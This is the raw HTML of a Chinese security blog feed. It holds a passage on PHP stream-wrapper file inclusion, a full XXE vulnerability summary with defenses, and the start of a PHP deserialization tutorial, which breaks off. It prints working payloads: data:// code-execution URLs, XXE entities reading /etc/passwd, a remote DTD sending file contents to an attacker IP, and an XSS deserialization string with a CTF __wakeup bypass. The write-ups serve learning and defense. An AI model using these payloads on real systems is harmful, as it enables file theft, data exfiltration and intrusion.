<h2 id="zlib-amp-zip-amp-bzip2"><a href="#zlib-amp-zip-amp-bzip2" class="headerlink" title="zlib:// &amp; zip:// &amp; bzip2://"></a>zlib:// &amp; zip:// &amp; bzip2://</h2><p>均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。</p>
<p>条件：<code>allow_url_fopen: off/on</code>  、 <code>allow_url_include: off/on</code></p>
<p>用法及示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;compress.zlib:&#x2F;&#x2F;E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</span><br><span class="line">	compress.zlib:&#x2F;&#x2F;file.gz</span><br><span class="line">	压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</span><br><span class="line">	</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;zip:&#x2F;&#x2F;E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</span><br><span class="line">	zip:&#x2F;&#x2F;[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）</span><br><span class="line">	压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</span><br><span class="line">	</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;compress.bzip2:&#x2F;&#x2F;E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span><br><span class="line">	compress.bzip2:&#x2F;&#x2F;file.bz2</span><br><span class="line">	压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</span><br></pre></td></tr></table></figure>



<h2 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h2><p>自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p>
<p>条件：<code>allow_url_fopen：on</code> 、 <code>allow_url_include：on</code></p>
<p>用法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:&#x2F;&#x2F;text&#x2F;plain,</span><br><span class="line">data:&#x2F;&#x2F;text&#x2F;plain;base64, </span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php%20phpinfo();?&gt;</span><br><span class="line">	data:&#x2F;&#x2F;text&#x2F;plain,</span><br><span class="line">	</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br><span class="line">	data:&#x2F;&#x2F;text&#x2F;plain;base64,</span><br></pre></td></tr></table></figure>



<h2 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h2><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容。</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;phar:&#x2F;&#x2F;E:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;phpinfo.zip&#x2F;phpinfo.txt</span><br></pre></td></tr></table></figure>



<p>另外，在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：<code>phar://</code>协议对象注入技术。具体原理可以参考我另外一篇总结中所写：</p>
<blockquote>
<p>参考文章：<a href="https://jiulin.space/2020/12/26/php1/#more">php反序列化漏洞总结</a></p>
</blockquote>
<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp://"></a>ftp://</h2><p>一种提供网络之间共享文件的协议，可以在计算机之间可靠、高效地传送文件。FTP协议包括两个组成部分，其一为FTP服务器，其二为FTP客户端。其中FTP服务器用来存储文件，用户可以使用FTP客户端通过FTP协议访问位于FTP服务器上的资源。在开发网站的时候，通常利用FTP协议把网页或程序传到Web服务器上。</p>
<p>我们见到的大量CMS系统，也都是通过ftp来进行文件传输的。</p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
  </entry>
  <entry>
    <title>XXE漏洞总结</title>
    <url>/2021/01/23/xxe/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文主要总结XML外部实体注入漏洞。文中部分内容直接或间接引用于其他大牛的文章中，我都会标明出处，如有侵权，请发邮箱联系我删除。多有不合理之处，望大佬指点。</p>
<hr>
<h1 id="XML基础知识"><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a>XML基础知识</h1><p>要想了解XXE漏洞，首先得懂得基础知识，了解XML文档的基本知识。</p>
<h2 id="XML概述"><a href="#XML概述" class="headerlink" title="XML概述"></a>XML概述</h2><p>XML是一种用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。其类似于HTML，但HTML 旨在显示信息，而 XML 旨在传输信息。<a id="more"></a></p>
<h2 id="XML结构"><a href="#XML结构" class="headerlink" title="XML结构"></a>XML结构</h2><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/1.png"></p>
<h2 id="XML文档的构建模块"><a href="#XML文档的构建模块" class="headerlink" title="XML文档的构建模块"></a>XML文档的构建模块</h2><p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：</p>
<ul>
<li>元素</li>
<li>属性</li>
<li>实体</li>
<li>PCDATA</li>
<li>CDATA</li>
</ul>
<p>下面是每个构建模块的简要描述。</p>
<h3 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h3><p>XML元素是XML以及HTML文档的主要构建模块，指的是从（且包括）开始标签直到（且包括）结束标签的部分。元素可包含文本、其他元素或者是空的。</p>
<p>实例:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>body text in between<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>some message in between<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p>属性可提供有关元素的额外信息。属性不能包含多个值，且不能包含树结构。</p>
<p>实例：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">file</span> <span class="attr">type</span>=<span class="string">&quot;gif&quot;</span>&gt;</span>computer.gif<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p>
<p>实体引用是对实体的引用。</p>
<p>实体可在内部或外部进行声明。</p>
<h3 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h3><p>PCDATA 的意思是被解析的字符数据(parsed character data)。<br>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</p>
<h3 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h3><p>CDATA 的意思是字符数据(character data)。<br>CDATA 是不会被解析器解析的文本。</p>
<h2 id="DTD-文档类型定义"><a href="#DTD-文档类型定义" class="headerlink" title="DTD(文档类型定义)"></a>DTD(文档类型定义)</h2><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。</p>
<p>DTD 既可以在 XML 文档内声明，也可以外部引用。</p>
<ol>
<li><p>内部声明的语法：&lt;!DOCTYPE 根元素 [元素声明]&gt; 。例如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span>      (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span>    (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span>    (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>外部声明(引用外部DTD)：&lt;!DOCTYPE 根元素 SYSTEM “文件名”&gt;。如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span> </span><br></pre></td></tr></table></figure>



</li>
</ol>
   <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- note.dtd内容 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure>





<h2 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h2><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
<p>实体又分为一般实体和参数实体。</p>
<ul>
<li><p>一般实体的声明语法：<code>&lt;!ENTITY 实体名 &quot;实体内容&quot;&gt;</code></p>
<p>引用实体的方式：<code>&amp;实体名;</code>（一个和号 (&amp;)、一个实体名称、以及一个分号 (;)）</p>
</li>
<li><p>参数实体只能在DTD中使用，参数实体的声明格式： <code>&lt;!ENTITY % 实体名 &quot;实体内容&quot;&gt;</code></p>
<p>引用实体的方式：<code>%实体名;</code></p>
</li>
</ul>
<ol>
<li><p>内部实体声明：&lt;!ENTITY 实体名称 “实体的值”&gt; 。例如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">writer</span> <span class="meta-string">&quot;Bill Gates&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">copyright</span> <span class="meta-string">&quot;Copyright W3School.com.cn&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>外部实体声明：&lt;!ENTITY 实体名称 SYSTEM “URI”&gt;。例如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">writer</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">copyright</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>





</li>
</ol>
<hr>
<h1 id="XXE攻击方式"><a href="#XXE攻击方式" class="headerlink" title="XXE攻击方式"></a>XXE攻击方式</h1><p>当应用是通过用户上传的XML文件或POST请求进行数据的传输，并且应用没有禁止XML引用外部实体，也没有过滤用户提交的XML数</p>
<p>据，那么就会产生XML外部实体注入漏洞。</p>
<p>引入外部实体方式有多种，比如：</p>
<ol>
<li><p><strong>直接通过DTD外部实体声明</strong></p>
<p>XML内容：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果以上xml代码被解析，则会返回/etc/passwd文件的内容。</p>
</li>
</ol>
<ol start="2">
<li><p><strong>通过DTD文档引入外部DTD文档，再引入外部实体声明</strong></p>
<p>XML内容：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http:/mark4z5.com/evil.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>DTD文件内容：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ol>
<ol start="3">
<li><p><strong>通过DTD外部实体声明引入外部实体声明</strong></p>
<p>意思就是先写一个外部实体声明，然后引用的是在攻击者服务器上面的外部实体声明。如下XML内容：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [<span class="meta">&lt;!ENTITY % d <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http:/mark4z5.com/evil.dtd&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">%d;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>dtd文件内容：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ol>
<p>   要注意的是，在上面的例子中，例1和例2实体名前面并没有<code>%</code>，而例3中的实体名前是有<code>%</code>的，这里的区别在于，例1中定义的实体是通用实体，而例2中定义的是参数实体，并且参数实体只能在DTD中使用，即例2代码中的第三行 <code>%d;</code>，这里就像在外面引用统用实体一样，这里的%d;就引用了<code>http:/mark4z5.com/evil.dtd</code>这个文件到DTD中。</p>
<p>不同程序支持的协议不同，如下：</p>
<table>
<thead>
<tr>
<th align="left">LIBXML2</th>
<th align="left">PHP</th>
<th align="left">JAVA</th>
<th align="left">.NET</th>
</tr>
</thead>
<tbody><tr>
<td align="left">file</td>
<td align="left">file</td>
<td align="left">http</td>
<td align="left">file</td>
</tr>
<tr>
<td align="left">http</td>
<td align="left">http</td>
<td align="left">https</td>
<td align="left">http</td>
</tr>
<tr>
<td align="left">ftp</td>
<td align="left">ftp</td>
<td align="left">ftp</td>
<td align="left">https</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">php</td>
<td align="left">file</td>
<td align="left">ftp</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">compress.zlib</td>
<td align="left">jar</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"></td>
<td align="left">compress.bzip2</td>
<td align="left">netdoc</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"></td>
<td align="left">data</td>
<td align="left">mailto</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"></td>
<td align="left">glob</td>
<td align="left">gopher</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"></td>
<td align="left">phar</td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<p>其中php支持的协议会更多一些，但需要一定的扩展支持。</p>
<hr>
<h1 id="XXE实例"><a href="#XXE实例" class="headerlink" title="XXE实例"></a>XXE实例</h1><p>XXE可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
<p><strong>实例一：读取任意文件</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/2.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/3.png"></p>
<p>这里是读取/etc/passwd，有些XML解析库支持列目录，攻击者通过列目录、读文件，获取帐号密码后进一步攻击，如读取tomcat-users.xml得到帐号密码后登录tomcat的manager部署webshell。</p>
<p>另外，当数据不回显的时候，可以把数据发送到远程服务器，在触发XXE攻击之后，服务器会把文件内容发送到攻击者网站。</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/4.png"></p>
<p>远程DTD文件内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://192.168.1.122/?%file;&#x27;&gt;&quot;</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/5.png"></p>
<p><strong>实例二：执行系统命令</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/6.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/7.png"></p>
<p>这里是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。</p>
<p><strong>实例三：探测内网端口</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/8.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/9.png"></p>
<p>通过这里探测192.168.1.1的80、81端口，通过返回的“Connection refused”可以知道该81端口是closed的，而80端口是open的。</p>
<p><strong>实例四：攻击内网网站</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/10.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/11.png"></p>
<p>该例子是攻击内网struts2网站，远程执行了系统命令。</p>
<hr>
<h1 id="防御XXE攻击"><a href="#防御XXE攻击" class="headerlink" title="防御XXE攻击"></a>防御XXE攻击</h1><p>对于这种危害很大的漏洞，我们要进行防御。</p>
<p>防御方法：</p>
<ol>
<li><p>使用开发语言提供的方法禁用外部实体</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PHP：</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"></span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">Python：</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))</span><br></pre></td></tr></table></figure>



</li>
</ol>
<ol start="2">
<li><p>过滤和验证用户提交的XML数据</p>
<p>一般过滤的关键词：<code>&lt;!DOCTYPE</code>和<code>&lt;!ENTITY</code>，或者<code>SYSTEM</code>和<code>PUBLIC</code>。</p>
</li>
</ol>
<ol start="3">
<li>不允许XML中含有任何自己声明的DTD</li>
</ol>
]]></content>
      <categories>
        <category>XXE</category>
      </categories>
  </entry>
  <entry>
    <title>PHP反序列化漏洞总结</title>
    <url>/2020/12/26/php1/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​    本文主要总结php反序列化漏洞。为了总结全面一点，文中部分内容直接或间接引用于其他大牛的文章中，我都会标明出处，如有侵权，请发邮箱联系我删除。多有不合理之处，望大佬指点。</p>
<hr>
<h1 id="反序列化原理"><a href="#反序列化原理" class="headerlink" title="反序列化原理"></a>反序列化原理</h1><p>PHP序列化和反序列化主要是通过<code>serialize</code>  、<code>unserialize</code> 两个函数来分别实现，序列化就是将对象转换为可保存或传输的字符串的格式，反序列化就是把字符串格式恢复回原本的对象。在PHP中，序列化和反序列化一般用做缓存，比如session缓存，cookie等。<a id="more"></a></p>
<p>以下是一个php序列化的实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class DemoClass    	&#x2F;&#x2F;定义一个DemoClass类</span><br><span class="line">&#123;</span><br><span class="line">public $name  &#x3D; &#39;DemoClass&#39;;   &#x2F;&#x2F;定义一个name变量</span><br><span class="line">public $sex &#x3D; &quot;man&quot;;	&#x2F;&#x2F;定义一个sex变量</span><br><span class="line">public $age &#x3D; &quot;7&quot;; &#x2F;&#x2F;定义一个age变量</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$example &#x3D; new DemoClass();   &#x2F;&#x2F;创建一个对象</span><br><span class="line">$example-&gt;name &#x3D;&quot;John&quot;;</span><br><span class="line">$example-&gt;sex &#x3D; &quot;Woman&quot;;</span><br><span class="line">$example-&gt;age &#x3D; &quot;18&quot;  &#x2F;&#x2F;修改其中属性的值</span><br><span class="line"></span><br><span class="line">echo serialize($example)   &#x2F;&#x2F;返回序列化的结果</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.1/php1/1.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;序列化第一位的含义：</span><br><span class="line">String</span><br><span class="line">  s:size:value;</span><br><span class="line">Integer</span><br><span class="line">  i:value;</span><br><span class="line">Boolean</span><br><span class="line">  b:value; (does not store &quot;true&quot; or &quot;false&quot;, does store &#39;1&#39; or &#39;0&#39;)</span><br><span class="line">Null</span><br><span class="line">  N;</span><br><span class="line">Array</span><br><span class="line">  a:size:&#123;key definition;value definition;(repeated per element)&#125;</span><br><span class="line">Object</span><br><span class="line">  O:strlen(object name):object name:object size:&#123;s:strlen(property name):property name:property definition;(repeated per property)&#125;</span><br></pre></td></tr></table></figure>





<hr>
<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>在php中，有一种叫做”魔术方法“的东西，我们在序列化和反序列化的过程中，可能会使用到其中的部分“魔法函数”，而这些函数在执行时就有可能为我们所利用。</p>
<p>下面是比较典型的PHP反序列化漏洞中可能会用到的魔法函数：</p>
<blockquote>
<p> <strong>__wakeup</strong></p>
<p> <code>unserialize</code>会检查是否存在一个_<code>wakeup</code>( ) 方法。如果存在，则会先调用_wakeup 方法，预先准备对象需要的资源。</p>
<p> <strong>__construct</strong> </p>
<p> 具有构造函数的类会在每次创建新对象时先调用此方法。</p>
<p> <strong>__destruct</strong></p>
<p> 析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</p>
<p> <strong>__toString</strong> </p>
<p> 用于一个类被当成字符串时使用。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</p>
<p> <strong>__sleep</strong> </p>
<p> 在对象在被序列化之前运行。</p>
<p> <strong>__call</strong></p>
<p> 在对象上下文中调用不可访问的方法时触发。</p>
</blockquote>
<h2 id="最简单的反序列化"><a href="#最简单的反序列化" class="headerlink" title="最简单的反序列化"></a>最简单的反序列化</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">&quot;demo&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">$a_unser = unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>构造：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">test=O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">28</span>:<span class="string">&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>这样就利用<code>__destruct()</code>造成了XSS。当然结合实际环境可以造成更大的危害。</p>
<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><ul>
<li><p><strong>__wake up</strong>的绕过</p>
<p><code>_wakeup</code>在<code>unserialize()</code>时自动调用，当序列化字符串表示对象属性个数的值大于真实个数的属性时，会跳过对<code>__wakeup</code>的执行。</p>
<p>例如下面这道题：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.1/php1/2.png"></p>
<p>由代码可以看出，flag在<code>flag1.php</code>里，下面的<code>if else</code>里如果没有参数tryhackme就会打印本页源码，有的话则打印指定文件内容，    所以我们要利用<code>_wakeup()</code>绕过把file改成<code>flag1.php</code>。百度得知绕过的方法：</p>
<blockquote>
<p>_wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</p>
</blockquote>
<p>​    所以我们这么写：</p>
<blockquote>
<p>O:5:”SoFun”:2:{}</p>
</blockquote>
<p>只有一个对象，但是依然写2，就可以绕过了。</p>
</li>
</ul>
<ul>
<li><p><strong>__wakeup() 或__destruct()的利用</strong></p>
